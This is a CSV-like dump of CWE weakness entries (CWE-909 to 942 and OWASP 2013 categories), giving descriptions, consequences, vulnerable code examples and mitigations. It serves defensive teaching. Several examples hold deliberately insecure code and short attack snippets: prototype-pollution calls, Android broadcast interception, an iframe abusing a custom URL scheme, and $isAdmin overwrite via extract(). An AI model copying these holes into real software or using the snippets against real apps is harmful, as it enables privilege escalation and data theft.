CWE-909: Missing Initialization of Resource,The product does not initialize a critical resource.,"Scope: Confidentiality, Impact: Technical Impact:Read Memory; Read Application DataWhen reusing a resource such as memory or a program variable, the original contents of that resource may not be cleared before it is sent to an untrusted party., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartThe uninitialized resource may contain values that cause program flow to change in ways that the programmer did not intend., Likelihood: ","Example 1Here, a boolean initiailized field is consulted to ensure that initialization tasks are only completed once. However, the field is mistakenly set to true during static initialization, so the initialization code is never reached.(bad code)Example Language:Javaprivate boolean initialized = true;public void someMethod() {if (!initialized) {// perform initialization tasks...initialized = true;}Example 2The following code intends to limit certain operations to the administrator only.(bad code)Example Language:Perl$username = GetCurrentUser();$state = GetStateData($username);if (defined($state)) {$uid = ExtractUserID($state);}# do stuffif ($uid == 0) {DoAdminThings();}If the application is unable to extract the state information - say, due to a database timeout - then the $uid variable will not be explicitly set by the programmer. This will cause $uid to be regarded as equivalent to ""0"" in the conditional, allowing the original user to perform administrator actions. Even if the attacker cannot directly influence the state data, unexpected errors could cause incorrect privileges to be assigned to a user just by accident.Example 3The following code intends to concatenate a string to a variable and print the string.(bad code)Example Language:Cchar str[20];strcat(str, ""hello world"");printf(""%s"", str);This might seem innocent enough, but str was not initialized, so it contains random memory. As a result, str[0] might not contain the null terminator, so the copy might start at an offset other than 0. The consequences can vary, depending on the underlying memory.If a null terminator is found before str[8], then some bytes of random garbage will be printed before the ""hello world"" string. The memory might contain sensitive information from previous uses, such as a password (which might occur as a result ofCWE-14orCWE-244). In this example, it might not be a big deal, but consider what could happen if large amounts of memory are printed out before the null terminator is found.If a null terminator isn't found before str[8], then a buffer overflow could occur, since strcat will first look for the null terminator, then copy 12 bytes starting with that location. Alternately, a buffer over-read might occur (CWE-126) if a null terminator isn't found before the end of the memory segment is reached, leading to a segmentation fault and crash.Example 4This example will leave test_string in an unknown condition when i is the same value as err_val, because test_string is not initialized (CWE-456). Depending on where this code segment appears (e.g. within a function body), test_string might be random if it is stored on the heap or stack. If the variable is declared in static memory, it might be zero or NULL. Compiler optimization might contribute to the unpredictability of this address.(bad code)Example Language:Cchar *test_string;if (i != err_val){test_string = ""Hello World!"";}printf(""%s"", test_string);When the printf() is reached, test_string might be an unexpected address, so the printf might print junk strings (CWE-457).To fix this code, there are a couple approaches to
			  making sure that test_string has been properly set once
			  it reaches the printf().One solution would be to set test_string to an
			  acceptable default before the conditional:(good code)Example Language:Cchar *test_string = ""Done at the beginning"";if (i != err_val){test_string = ""Hello World!"";}printf(""%s"", test_string);Another solution is to ensure that each
			  branch of the conditional - including the default/else
			  branch - could ensure that test_string is set:(good code)Example Language:Cchar *test_string;if (i != err_val){test_string = ""Hello World!"";}else {test_string = ""Done on the other side!"";}printf(""%s"", test_string);","Phase:  ImplementationExplicitly initialize the resource before use. If this is performed through an API function or standard procedure, follow all specified steps.Phase:  ImplementationPay close attention to complex conditionals that affect initialization, since some branches might not perform the initialization.Phase:  ImplementationAvoid race conditions (CWE-362) during initialization routines.Phase:  Build and CompilationRun or compile your product with settings that generate warnings about uninitialized variables or data."
CWE-910: Use of Expired File Descriptor,The product uses or accesses a file descriptor after it has been closed.,"Scope: Confidentiality, Impact: Technical Impact:Read Files or DirectoriesThe program could read data from the wrong file., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartAccessing a file descriptor that has been closed can cause a crash., Likelihood: ",无示范例子,无可能的缓解方案
CWE-911: Improper Update of Reference Count,"The product uses a reference count to manage a resource, but it does not update or incorrectly updates the reference count.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-912: Hidden Functionality,"The product contains functionality that is not documented, not part of the specification, and not accessible through an interface or command sequence that is obvious to the product's users or administrators.","Scope: OtherIntegrity, Impact: Technical Impact:Varies by Context; Alter Execution Logic, Likelihood: ",无示范例子,"Phase:  InstallationAlways verify the integrity of the product that is being installed.Phase:  TestingConduct a code coverage analysis using live testing, then closely inspect any code that is not covered."
CWE-913: Improper Control of Dynamically-Managed Code Resources,"The product does not properly restrict reading from or writing to dynamically-managed code resources such as variables, objects, classes, attributes, functions, or executable instructions or statements.","Scope: Integrity, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ; Scope: OtherIntegrity, Impact: Technical Impact:Varies by Context; Alter Execution Logic, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationFor any externally-influenced input, check the input against an allowlist of acceptable values.Phases:  Implementation; Architecture and DesignStrategy:  RefactoringRefactor the code so that it does not need to be dynamically managed."
CWE-914: Improper Control of Dynamically-Identified Variables,The product does not properly restrict reading from or writing to dynamically-identified variables.,"Scope: Integrity, Impact: Technical Impact:Modify Application DataAn attacker could modify sensitive data or program variables., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ; Scope: OtherIntegrity, Impact: Technical Impact:Varies by Context; Alter Execution Logic, Likelihood: ","Example 1This code uses the credentials sent in a POST request to login a user.(bad code)Example Language:PHP//Log user in, and set $isAdmin to true if user is an administratorfunction login($user,$pass){$query = buildQuery($user,$pass);mysql_query($query);if(getUserRole($user) == ""Admin""){$isAdmin = true;}}$isAdmin = false;extract($_POST);login(mysql_real_escape_string($user),mysql_real_escape_string($pass));The call to extract() will overwrite the existing values of any variables defined previously, in this case $isAdmin. An attacker can send a POST request with an unexpected third value ""isAdmin"" equal to ""true"", thus gaining Admin privileges.","Phase:  ImplementationStrategy:  Input ValidationFor any externally-influenced input, check the input against an allowlist of internal program variables that are allowed to be modified.Phases:  Implementation; Architecture and DesignStrategy:  RefactoringRefactor the code so that internal program variables do not need to be dynamically identified."
CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes,"The product receives input from an upstream component that specifies multiple attributes, properties, or fields that are to be initialized or updated in an object, but it does not properly control which attributes can be modified.","Scope: Integrity, Impact: Technical Impact:Modify Application DataAn attacker could modify sensitive data or program variables., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ; Scope: OtherIntegrity, Impact: Technical Impact:Varies by Context; Alter Execution Logic, Likelihood: ","Example 1This function sets object attributes based on a dot-separated path.(bad code)Example Language:JavaScriptfunction setValueByPath (object, path, value) {const pathArray = path.split(""."");const attributeToSet = pathArray.pop();let objectToModify = object;for (const attr of pathArray) {if (typeof objectToModify[attr] !== 'object') {objectToModify[attr] = {};}objectToModify = objectToModify[attr];}objectToModify[attributeToSet] = value;return object;}This function does not check if the attribute resolves to the object prototype. These codes can be used to add ""isAdmin: true"" to the object prototype.(bad code)Example Language:JavaScriptsetValueByPath({}, ""__proto__.isAdmin"", true)setValueByPath({}, ""constructor.prototype.isAdmin"", true)By using a denylist of dangerous attributes, this weakness can be eliminated.(good code)Example Language:JavaScriptfunction setValueByPath (object, path, value) {const pathArray = path.split(""."");const attributeToSet = pathArray.pop();let objectToModify = object;for (const attr of pathArray) {// Ignore attributes which resolve to object prototypeif (attr === ""__proto__"" || attr === ""constructor"" || attr === ""prototype"") {continue;}if (typeof objectToModify[attr] !== ""object"") {objectToModify[attr] = {};}objectToModify = objectToModify[attr];}objectToModify[attributeToSet] = value;return object;}","Phase:  ImplementationIf available, use features of the language or framework that allow specification of allowlists of attributes or fields that are allowed to be modified. If possible, prefer allowlists over denylists.For applications written with Ruby on Rails, use the attr_accessible (allowlist) or attr_protected (denylist) macros in each class that may be used in mass assignment.Phases:  Architecture and Design; ImplementationIf available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified.Phase:  ImplementationStrategy:  Input ValidationFor any externally-influenced input, check the input against an allowlist of internal object attributes or fields that are allowed to be modified.Phases:  Implementation; Architecture and DesignStrategy:  RefactoringRefactor the code so that object attributes or fields do not need to be dynamically identified, and only expose getter/setter functionality for the intended attributes."
CWE-916: Use of Password Hash With Insufficient Computational Effort,"The product generates a hash for a password, but it uses a scheme that does not provide a sufficient level of computational effort that would make password cracking attacks infeasible or expensive.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume IdentityIf an attacker can gain access to the hashes, then the lack of sufficient computational effort will make it easier to conduct brute force attacks using techniques such as rainbow tables, or specialized hardware such as GPUs, which can be much faster than general-purpose CPUs for computing hashes., Likelihood: ","Example 1In this example, a new user provides a new username and password to create an account. The program hashes the new user's password then stores it in a database.(bad code)Example Language:Pythondef storePassword(userName,Password):hasher = hashlib.new('md5')hasher.update(Password)hashedPassword = hasher.digest()# UpdateUserLogin returns True on success, False otherwisereturn updateUserLogin(userName,hashedPassword)While it is good to avoid storing a cleartext password, the program does not provide a salt to the hashing function, thus increasing the chances of an attacker being able to reverse the hash and discover the original password if the database is compromised.Fixing this is as simple as providing a salt to the hashing function on initialization:(good code)Example Language:Pythondef storePassword(userName,Password):hasher = hashlib.new('md5',b'SaltGoesHere')hasher.update(Password)hashedPassword = hasher.digest()# UpdateUserLogin returns True on success, False otherwisereturn updateUserLogin(userName,hashedPassword)Note that regardless of the usage of a salt, the md5 hash is no longer considered secure, so this example still exhibitsCWE-327.","Phase:  Architecture and DesignUse an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations (""stretching"") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.Effectiveness: HighPhases:  Implementation; Architecture and DesignWhen using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks."
CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection'),"The product constructs all or part of an expression language (EL) statement in a framework such as a Java Server Page (JSP) using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended EL statement before it is executed.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ; Scope: Integrity, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ",无示范例子,"Phase:  Architecture and DesignAvoid adding user-controlled data into an expression interpreter when possible.Phase:  ImplementationIf user-controlled data must be added to an expression interpreter, one or more of the following should be performed:Validate that the user input will not evaluate as an expressionEncode the user input in a way that ensures it is not evaluated as an expressionPhases:  System Configuration; OperationThe framework or tooling might allow the developer to disable or deactivate the processing of EL expressions, such as setting the isELIgnored attribute for a JSP page to ""true""."
CWE-918: Server-Side Request Forgery (SSRF),"The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ; Scope: Integrity, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ",无示范例子,无可能的缓解方案
CWE VIEW: Weaknesses in Mobile Applications,CWE entries in this view (slice) are often seen in mobile applications.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-920: Improper Restriction of Power Consumption,"The product operates in an environment in which power is a limited resource that cannot be automatically replenished, but the product does not properly restrict the amount of power that its operation consumes.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (Other); DoS: Crash, Exit, or RestartThe power source could be drained, causing the application - and the entire device - to cease functioning., Likelihood: ",无示范例子,无可能的缓解方案
CWE-921: Storage of Sensitive Data in a Mechanism without Access Control,The product stores sensitive information in a file system or device that does not have built-in access control.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data; Read Files or DirectoriesAttackers can read sensitive information by accessing the unrestricted storage mechanism., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Application Data; Modify Files or DirectoriesAttackers can modify or delete sensitive information by accessing the unrestricted storage mechanism., Likelihood: ",无示范例子,无可能的缓解方案
CWE-922: Insecure Storage of Sensitive Information,The product stores sensitive information without properly limiting read or write access by unauthorized actors.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data; Read Files or DirectoriesAttackers can read sensitive information by accessing the unrestricted storage mechanism., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Application Data; Modify Files or DirectoriesAttackers can overwrite sensitive information by accessing the unrestricted storage mechanism., Likelihood: ",无示范例子,无可能的缓解方案
CWE-923: Improper Restriction of Communication Channel to Intended Endpoints,"The product establishes a communication channel to (or from) an endpoint for privileged or protected operations, but it does not properly ensure that it is communicating with the correct endpoint.","Scope: IntegrityConfidentiality, Impact: Technical Impact:Gain Privileges or Assume IdentityIf an attacker can spoof the endpoint, the attacker gains all the privileges that were intended for the original endpoint., Likelihood: ","Example 1These cross-domain policy files mean to allow Flash and Silverlight applications hosted on other domains to access its data:Flash crossdomain.xml :(bad code)Example Language:XML<cross-domain-policy xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""xsi:noNamespaceSchemaLocation=""http://www.adobe.com/xml/schemas/PolicyFile.xsd""><allow-access-from domain=""*.example.com""/><allow-access-from domain=""*""/></cross-domain-policy>Silverlight clientaccesspolicy.xml :(bad code)Example Language:XML<?xml version=""1.0"" encoding=""utf-8""?><access-policy><cross-domain-access><policy><allow-from http-request-headers=""SOAPAction""><domain uri=""*""/></allow-from><grant-to><resource path=""/"" include-subpaths=""true""/></grant-to></policy></cross-domain-access></access-policy>These entries are far too permissive, allowing any Flash or Silverlight application to send requests. A malicious application hosted on any other web site will be able to send requests on behalf of any user tricked into executing it.Example 2This Android application will remove a user account when it receives an intent to do so:(bad code)Example Language:JavaIntentFilter filter = new IntentFilter(""com.example.RemoveUser"");MyReceiver receiver = new MyReceiver();registerReceiver(receiver, filter);public class DeleteReceiver extends BroadcastReceiver {@Overridepublic void onReceive(Context context, Intent intent) {int userID = intent.getIntExtra(""userID"");destroyUserData(userID);}}This application does not check the origin of the intent, thus allowing any malicious application to remove a user. Always check the origin of an intent, or create an allowlist of trusted applications using the manifest.xml file.",无可能的缓解方案
CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel,"The product establishes a communication channel with an endpoint and receives a message from that endpoint, but it does not sufficiently ensure that the message was not modified during transmission.","Scope: IntegrityConfidentiality, Impact: Technical Impact:Gain Privileges or Assume IdentityIf an attackers can spoof the endpoint, the attacker gains all the privileges that were intended for the original endpoint., Likelihood: ",无示范例子,无可能的缓解方案
CWE-925: Improper Verification of Intent by Broadcast Receiver,The Android application uses a Broadcast Receiver that receives an Intent but does not properly verify that the Intent came from an authorized source.,"Scope: Integrity, Impact: Technical Impact:Gain Privileges or Assume IdentityAnother application can impersonate the operating system and cause the software to perform an unintended action., Likelihood: ","Example 1The following example demonstrates the weakness.(bad code)Example Language:XML<manifest package=""com.example.vulnerableApplication""><application>...<receiver android:name="".ShutdownReceiver""><intent-filter><action android:name=""android.intent.action.ACTION_SHUTDOWN"" /></intent-filter></receiver>...</application></manifest>The ShutdownReceiver class will handle the intent:(bad code)Example Language:Java...IntentFilter filter = new IntentFilter(Intent.ACTION_SHUTDOWN);BroadcastReceiver sReceiver = new ShutDownReceiver();registerReceiver(sReceiver, filter);...public class ShutdownReceiver extends BroadcastReceiver {@Overridepublic void onReceive(final Context context, final Intent intent) {mainActivity.saveLocalData();mainActivity.stopActivity();}}Because the method does not confirm that the intent action is the expected system intent, any received intent will trigger the shutdown procedure, as shown here:(attack code)Example Language:Javawindow.location = examplescheme://method?parameter=valueAn attacker can use this behavior to cause a denial of service.","Phase:  Architecture and DesignBefore acting on the Intent, check the Intent Action to make sure it matches the expected System action."
CWE-926: Improper Export of Android Application Components,"The Android application exports a component for use by other applications, but does not properly restrict which applications can launch the component or access the data it contains.","Scope: AvailabilityIntegrity, Impact: Technical Impact:Unexpected State; DoS: Crash, Exit, or Restart; DoS: Instability; Varies by ContextOther applications, possibly untrusted, can launch the Activity., Likelihood: ; Scope: AvailabilityIntegrity, Impact: Technical Impact:Unexpected State; Gain Privileges or Assume Identity; DoS: Crash, Exit, or Restart; DoS: Instability; Varies by ContextOther applications, possibly untrusted, can bind to the Service., Likelihood: ; Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application Data; Modify Application DataOther applications, possibly untrusted, can read or modify the data that is offered by the Content Provider., Likelihood: ","Example 1This application is exporting an activity and a service in its manifest.xml:(bad code)Example Language:XML<activity android:name=""com.example.vulnerableApp.mainScreen"">...<intent-filter><action android:name=""com.example.vulnerableApp.OPEN_UI"" /><category android:name=""android.intent.category.DEFAULT"" /></intent-filter>...</activity><service android:name=""com.example.vulnerableApp.backgroundService"">...<intent-filter><action android:name=""com.example.vulnerableApp.START_BACKGROUND"" /></intent-filter>...</service>Because these components have intent filters but have not explicitly set 'android:exported=false' elsewhere in the manifest, they are automatically exported so that any other application can launch them. This may lead to unintended behavior or exploits.Example 2This application has created a content provider to enable custom search suggestions within the application:(bad code)Example Language:XML<provider>android:name=""com.example.vulnerableApp.searchDB""android:authorities=""com.example.vulnerableApp.searchDB""></provider>Because this content provider is only intended to be used within the application, it does not need to be exported. However, in Android before 4.2, it is automatically exported thus potentially allowing malicious applications to access sensitive information.","Phase:  Build and CompilationStrategy:  Attack Surface ReductionIf they do not need to be shared by other applications, explicitly mark components with android:exported=""false"" in the application manifest.Phase:  Build and CompilationStrategy:  Attack Surface ReductionIf you only intend to use exported components between related apps under your control, use android:protectionLevel=""signature"" in the xml manifest to restrict access to applications signed by you.Phases:  Build and Compilation; Architecture and DesignStrategy:  Attack Surface ReductionLimit Content Provider permissions (read/write) as appropriate.Phases:  Build and Compilation; Architecture and DesignStrategy:  Separation of PrivilegeLimit Content Provider permissions (read/write) as appropriate."
CWE-927: Use of Implicit Intent for Sensitive Communication,The Android application uses an implicit intent for transmitting sensitive data to other applications.,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataOther applications, possibly untrusted, can read the data that is offered through the Intent., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Varies by ContextThe application may handle responses from untrusted applications on the device, which could cause it to perform unexpected or unauthorized actions., Likelihood: ","Example 1This application wants to create a user account in several trusted applications using one broadcast intent:(bad code)Example Language:JavaIntent intent = new Intent();intent.setAction(""com.example.CreateUser"");intent.putExtra(""Username"", uname_string);intent.putExtra(""Password"", pw_string);sendBroadcast(intent);This application assumes only the trusted applications will be listening for the action. A malicious application can register for this action and intercept the user's login information, as below:(attack code)Example Language:JavaIntentFilter filter = new IntentFilter(""com.example.CreateUser"");MyReceiver receiver = new MyReceiver();registerReceiver(receiver, filter);When a broadcast contains sensitive information, create an allowlist of applications that can receive the action using the application's manifest file, or programmatically send the intent to each individual intended receiver.Example 2This application interfaces with a web service that requires a separate user login. It creates a sticky intent, so that future trusted applications that also use the web service will know who the current user is:(bad code)Example Language:JavaIntent intent = new Intent();intent.setAction(""com.example.service.UserExists"");intent.putExtra(""Username"", uname_string);sendStickyBroadcast(intent);(attack code)Example Language:JavaIntentFilter filter = new IntentFilter(""com.example.service.UserExists"");MyReceiver receiver = new MyReceiver();registerReceiver(receiver, filter);Sticky broadcasts can be read by any application at any time, and so should never contain sensitive information such as a username.Example 3This application is sending an ordered broadcast, asking other applications to open a URL:(bad code)Example Language:JavaIntent intent = new Intent();intent.setAction(""com.example.OpenURL"");intent.putExtra(""URL_TO_OPEN"", url_string);sendOrderedBroadcastAsUser(intent);Any application in the broadcast chain may alter the data within the intent. This malicious application is altering the URL to point to an attack site:(attack code)Example Language:Javapublic class CallReceiver extends BroadcastReceiver {@Overridepublic void onReceive(Context context, Intent intent) {String Url = intent.getStringExtra(Intent.URL_TO_OPEN);attackURL = ""www.example.com/attack?"" + Url;setResultData(attackURL);}}The final receiving application will then open the attack URL. Where possible, send intents to specific trusted applications instead of using a broadcast chain.Example 4This application sends a special intent with a flag that allows the receiving application to read a data file for backup purposes.(bad code)Example Language:JavaIntent intent = new Intent();intent.setAction(""com.example.BackupUserData"");intent.setData(file_uri);intent.addFlags(FLAG_GRANT_READ_URI_PERMISSION);sendBroadcast(intent);(attack code)Example Language:Javapublic class CallReceiver extends BroadcastReceiver {@Overridepublic void onReceive(Context context, Intent intent) {Uri userData = intent.getData();stealUserData(userData);}}Any malicious application can register to receive this intent. Because of the FLAG_GRANT_READ_URI_PERMISSION included with the intent, the malicious receiver code can read the user's data.","Phase:  ImplementationIf the application only requires communication with its own components, then the destination is always known, and an explicit intent could be used."
CWE VIEW: Weaknesses in OWASP Top Ten (2013),"CWE nodes in this view (graph) are associated with the OWASP Top Ten, as released in 2013. This view is considered obsolete as a newer version of the OWASP Top Ten is available.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2013 Category A1 - Injection,Weaknesses in this category are related to the A1 category in the OWASP Top Ten 2013.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2013 Category A2 - Broken Authentication and Session Management,Weaknesses in this category are related to the A2 category in the OWASP Top Ten 2013.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2013 Category A3 - Cross-Site Scripting (XSS),Weaknesses in this category are related to the A3 category in the OWASP Top Ten 2013.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2013 Category A4 - Insecure Direct Object References,Weaknesses in this category are related to the A4 category in the OWASP Top Ten 2013.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2013 Category A5 - Security Misconfiguration,Weaknesses in this category are related to the A5 category in the OWASP Top Ten 2013.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2013 Category A6 - Sensitive Data Exposure,Weaknesses in this category are related to the A6 category in the OWASP Top Ten 2013.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2013 Category A7 - Missing Function Level Access Control,Weaknesses in this category are related to the A7 category in the OWASP Top Ten 2013.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2013 Category A8 - Cross-Site Request Forgery (CSRF),Weaknesses in this category are related to the A8 category in the OWASP Top Ten 2013.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2013 Category A9 - Using Components with Known Vulnerabilities,Weaknesses in this category are related to the A9 category in the OWASP Top Ten 2013.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2013 Category A10 - Unvalidated Redirects and Forwards,Weaknesses in this category are related to the A10 category in the OWASP Top Ten 2013.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-939: Improper Authorization in Handler for Custom URL Scheme,"The product uses a handler for a custom URL scheme, but it does not properly restrict which actors can invoke the handler using the scheme.",无常见后果信息,"Example 1This iOS application uses a custom URL scheme. The replaceFileText action in the URL scheme allows an external application to interface with the file incomingMessage.txt and replace the contents with the text field of the query string.External Application(good code)Example Language:Objective-CNSString *stringURL = @""appscheme://replaceFileText?file=incomingMessage.txt&text=hello"";NSURL *url = [NSURL URLWithString:stringURL];[[UIApplication sharedApplication] openURL:url];Application URL Handler(bad code)- (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url {if (!url) {return NO;}NSString *action = [url host];if([action isEqualToString: @""replaceFileText""]) {NSDictionary *dict = [self parseQueryStringExampleFunction:[url query]];//this function will write contents to a specified fileFileObject *objectFile = [self writeToFile:[dict objectForKey: @""file""] withText:[dict objectForKey: @""text""]];}return YES;}The handler has no restriction on who can use its functionality. The handler can be invoked using any method that invokes the URL handler such as the following malicious iframe embedded on a web page opened by Safari.(attack code)Example Language:HTML<iframe src=""appscheme://replaceFileText?file=Bookmarks.dat&text=listOfMaliciousWebsites"">The attacker can host a malicious website containing the iframe and trick users into going to the site via a crafted phishing email. Since Safari automatically executes iframes, the user is not prompted when the handler executes the iframe code which automatically invokes the URL handler replacing the bookmarks file with a list of malicious websites. Since replaceFileText is a potentially dangerous action, an action that modifies data, there should be a sanity check before the writeToFile:withText: function.Example 2These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application:(bad code)Example Language:Java// Android@Overridepublic boolean shouldOverrideUrlLoading(WebView view, String url){if (url.substring(0,14).equalsIgnoreCase(""examplescheme:"")){if(url.substring(14,25).equalsIgnoreCase(""getUserInfo"")){writeDataToView(view, UserData);return false;}else{return true;}}}(bad code)Example Language:Objective-C// iOS-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType{NSURL *URL = [exRequest URL];if ([[URL scheme] isEqualToString:@""exampleScheme""]){NSString *functionString = [URL resourceSpecifier];if ([functionString hasPrefix:@""specialFunction""]){// Make data available back in webview.UIWebView *webView = [self writeDataToView:[URL query]];}return NO;}return YES;}A call into native code can then be initiated by passing parameters within the URL:(attack code)Example Language:JavaScriptwindow.location = examplescheme://method?parameter=valueBecause the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site.","Phase:  Architecture and DesignUtilize a user prompt pop-up to authorize potentially harmful actions such as those modifying data or dealing with sensitive information.When designing functionality of actions in the URL scheme, consider whether the action should be accessible to all mobile applications, or if an allowlist of applications to interface with is appropriate."
CWE-940: Improper Verification of Source of a Communication Channel,"The product establishes a communication channel to handle an incoming request that has been initiated by an actor, but it does not properly verify that the request is coming from the expected origin.","Scope: Access ControlOther, Impact: Technical Impact:Gain Privileges or Assume Identity; Varies by ContextAn attacker can access any functionality that is inadvertently accessible to the source., Likelihood: ","Example 1This Android application will remove a user account when it receives an intent to do so:(bad code)Example Language:JavaIntentFilter filter = new IntentFilter(""com.example.RemoveUser"");MyReceiver receiver = new MyReceiver();registerReceiver(receiver, filter);public class DeleteReceiver extends BroadcastReceiver {@Overridepublic void onReceive(Context context, Intent intent) {int userID = intent.getIntExtra(""userID"");destroyUserData(userID);}}This application does not check the origin of the intent, thus allowing any malicious application to remove a user. Always check the origin of an intent, or create an allowlist of trusted applications using the manifest.xml file.Example 2These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application:(bad code)Example Language:Java// Android@Overridepublic boolean shouldOverrideUrlLoading(WebView view, String url){if (url.substring(0,14).equalsIgnoreCase(""examplescheme:"")){if(url.substring(14,25).equalsIgnoreCase(""getUserInfo"")){writeDataToView(view, UserData);return false;}else{return true;}}}(bad code)Example Language:Objective-C// iOS-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType{NSURL *URL = [exRequest URL];if ([[URL scheme] isEqualToString:@""exampleScheme""]){NSString *functionString = [URL resourceSpecifier];if ([functionString hasPrefix:@""specialFunction""]){// Make data available back in webview.UIWebView *webView = [self writeDataToView:[URL query]];}return NO;}return YES;}A call into native code can then be initiated by passing parameters within the URL:(attack code)Example Language:JavaScriptwindow.location = examplescheme://method?parameter=valueBecause the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site.","Phase:  Architecture and DesignUse a mechanism that can validate the identity of the source, such as a certificate, and validate the integrity of data to ensure that it cannot be modified in transit using an Adversary-in-the-Middle (AITM) attack.When designing functionality of actions in the URL scheme, consider whether the action should be accessible to all mobile applications, or if an allowlist of applications to interface with is appropriate."
CWE-941: Incorrectly Specified Destination in a Communication Channel,"The product creates a communication channel to initiate an outgoing request to an actor, but it does not correctly specify the intended destination for that actor.",无常见后果信息,"Example 1This code listens on a port for DNS requests and sends the result to the requesting address.(bad code)Example Language:Pythonsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)sock.bind( (UDP_IP,UDP_PORT) )while true:data = sock.recvfrom(1024)if not data:break(requestIP, nameToResolve) = parseUDPpacket(data)record = resolveName(nameToResolve)sendResponse(requestIP,record)This code sends a DNS record to a requesting IP address. UDP allows the source IP address to be easily changed ('spoofed'), thus allowing an attacker to redirect responses to a target, which may be then be overwhelmed by the network traffic.",无可能的缓解方案
CWE-942: Permissive Cross-domain Policy with Untrusted Domains,The product uses a cross-domain policy file that includes domains that should not be trusted.,"Scope: ConfidentialityIntegrityAvailabilityAccess Control, Impact: Technical Impact:Execute Unauthorized Code or Commands; Bypass Protection Mechanism; Read Application Data; Varies by ContextAn attacker may be able to bypass the web browser's same-origin policy. An attacker can exploit the weakness to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running ActiveX controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content., Likelihood: ","Example 1These cross-domain policy files mean to allow Flash and Silverlight applications hosted on other domains to access its data:Flash crossdomain.xml :(bad code)Example Language:XML<cross-domain-policy xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""xsi:noNamespaceSchemaLocation=""http://www.adobe.com/xml/schemas/PolicyFile.xsd""><allow-access-from domain=""*.example.com""/><allow-access-from domain=""*""/></cross-domain-policy>Silverlight clientaccesspolicy.xml :(bad code)Example Language:XML<?xml version=""1.0"" encoding=""utf-8""?><access-policy><cross-domain-access><policy><allow-from http-request-headers=""SOAPAction""><domain uri=""*""/></allow-from><grant-to><resource path=""/"" include-subpaths=""true""/></grant-to></policy></cross-domain-access></access-policy>These entries are far too permissive, allowing any Flash or Silverlight application to send requests. A malicious application hosted on any 